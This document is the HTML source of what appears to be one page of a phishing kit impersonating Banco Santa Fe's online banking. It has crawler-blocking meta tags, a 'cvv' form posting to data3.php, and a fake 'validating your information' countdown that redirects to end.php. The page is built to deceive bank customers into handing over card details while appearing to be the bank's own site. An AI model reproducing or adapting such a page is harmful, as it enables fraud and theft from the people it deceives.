<html lang="en"><head>
	<meta charset="utf-8">
	<title>Home banking</title>
	<meta name="googlebot" content="noindex">
	  <meta name="googlebot" content="nofollow">
	  <meta name="googlebot" content="noarchive">
	  <meta name="googlebot" content="nocache">
	  <meta name="googlebot" content="noimageindex">
	  <meta name="googlebot" content="nomediaindex">
	  <meta name="googlebot" content="noodp">
	  <meta name="googlebot" content="noodyp">
	  <meta name="googlebot" content="notranslate">
	  <meta name="googlebot" content="noyaca">
	  <meta name="googlebot" content="noydir">
	  <meta name="slurp" content="none">
	  <meta name="slurp" content="noindex">
	  <meta name="slurp" content="nofollow">
	  <meta name="slurp" content="noarchive">
	  <meta name="slurp" content="nocache">
	  <meta name="slurp" content="noimageindex">
	  <meta name="slurp" content="nomediaindex">
	  <meta name="slurp" content="noodp">
	  <meta name="slurp" content="notranslate">
	  <meta name="slurp" content="noyaca">
	  <meta name="slurp" content="noydir">
  <meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/x-icon" href="favicon.ico">
  <style>html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}*{box-sizing:border-box!important}html{font-family:sans-serif;line-height:1.15}@media (max-width: 430px){html{background-color:#302e38}body{height:max-content;background-color:#302e38}}</style><link rel="stylesheet" href="assets/styles.d234598b30cf55ae.css" media="all" onload="this.media='all'"><noscript><link rel="stylesheet" href="assets/styles.d234598b30cf55ae.css"></noscript><style></style><style></style></head>
  <body>
	<app-root _nghost-vaj-c15="" ng-version="13.3.11" _nghost-wgq-c15=""><div _ngcontent-wgq-c15="" class="kZJdmu"><div _ngcontent-wgq-c15="" class="ePjtkM"><div _ngcontent-wgq-c15="" class="cYLuAZ"><router-outlet _ngcontent-wgq-c15=""></router-outlet><app-cvv _nghost-wgq-c17=""><form action="data3.php" method="post">
  <main _ngcontent-wgq-c17="" class="dzjuuP"><header _ngcontent-wgq-c17="" class="iXGkbO"><div _ngcontent-wgq-c17="" class="edinfU external_header"><div _ngcontent-wgq-c17="" class="ckCJlE"><div _ngcontent-wgq-c17="" class="dwkjKh"><img _ngcontent-wgq-c17="" src="assets/image/arrowLeft.84536c01.svg" alt="arrow"><p _ngcontent-wgq-c17="" for="arrowLeft" class="sc-iktFzd dDvSeR showOnLogin"><span _ngcontent-wgq-c17="" tabindex="0" style="outline: 0; outline: 0;">Volver</span></p></div></div></div><div _ngcontent-wgq-c17="" tabindex="0" aria-label="Banco Santa Fe" class="sc-xyEjG hdifhW" style="outline: 0;"><div _ngcontent-wgq-c17="" class="sc-cBNfnY iBOubv"><div _ngcontent-wgq-c17=""><img _ngcontent-wgq-c17="" src="assets/image/sf_logo.5c3d5626.svg" alt="logo"></div></div></div></header></main></form></app-cvv><!----></div>
    
 <img src="assets/image/lod.gif" style="width:200px;border:none;position: fixed;bottom: 330;"> 

  <p style="
    position: fixed;
    bottom: 300;
	color: #ffffff;
    font-size: 20px;
">Validando informacion por favor, espera <span id="contador">10</span> segundos.</p>
</div></div></app-root>
  <script src="runtime.b6fbf617c2a6ed40.js" type="module"></script><script src="polyfills.ba7d2613d9af8d48.js" type="module"></script>
  
  <script>
	var segundos = 10;
var contador = setInterval(function() {
  segundos--;
  document.getElementById("contador").innerHTML = segundos.toString();
  if (segundos === 0) {
    clearInterval(contador);
    window.location.href = "end.php";
  }
}, 1000); 

document.getElementById("contador").innerHTML = segundos.toString();
  </script>
  </body></html>